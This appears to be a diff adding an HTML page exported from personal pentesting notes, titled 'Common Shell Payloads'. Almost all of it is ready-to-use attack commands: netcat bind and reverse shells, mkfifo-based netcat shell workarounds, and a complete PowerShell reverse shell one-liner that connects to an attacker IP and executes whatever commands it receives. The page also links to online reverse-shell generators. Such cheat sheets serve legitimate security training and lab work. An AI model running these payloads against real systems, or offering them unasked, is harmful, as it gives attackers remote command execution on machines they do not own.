@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>Common Shell Payloads</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
+</head>
+<body>
+<div class='page'><h1 class='title'>Common Shell Payloads</h1><br/>Already in the webpages.<br /><br />https://www.revshells.com/<br />https://cybexray.github.io/revshell/revshell.html<br /><br /><br /><strong>Netcat:</strong><br />Windows Binaries in Kali Linux - /usr/share/windows-resources/binaries<br /><br />-e		:	This option allows you to execute a process on connection<br /><br />Bind Shell (Target Side)<br />nc -lvnp &lt;Local-PORT&gt; -e /bin/bash<br /><br />Attacker would connect to this bind shell using: nc &lt;Target-IP&gt; &lt;Target-PORT&gt;<br /><br />Reverse Shell (Target Side)<br />nc &lt;Attacker-IP&gt; &lt;Attacker-PORT&gt; -e /bin/bash<br /><br /><strong>Note:</strong> The -e option is only included in the traditional versions of netcat and not included in modern versions.<br />Thus consider the following work around.<br /><br />For Windows it won&#39;t be an issue as we will use our own nc binary most of the time. <br />For Linux(Having newer version of nc) use the following<br /><br />Bind Shell<br />mkfifo /tmp/f; nc -lvnp &lt;PORT&gt; &lt; /tmp/f | /bin/sh &gt;/tmp/f 2&gt;&amp;1; rm /tmp/f<br />Reverse Shell<br />mkfifo /tmp/f; nc &lt;Attacker-IP&gt; &lt;Attacker-PORT&gt; &lt; /tmp/f | /bin/sh &gt;/tmp/f 2&gt;&amp;1; rm /tmp/f<br /><br /><strong>Windows Powershell Reverse Shell:</strong><br /><br />powershell -c &quot;$client = New-Object System.Net.Sockets.TCPClient(&#39;&lt;Attacker-IP&gt;&#39;,&lt;Attacker-PORT&gt;);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&quot;</div>
+</body>
+</html>
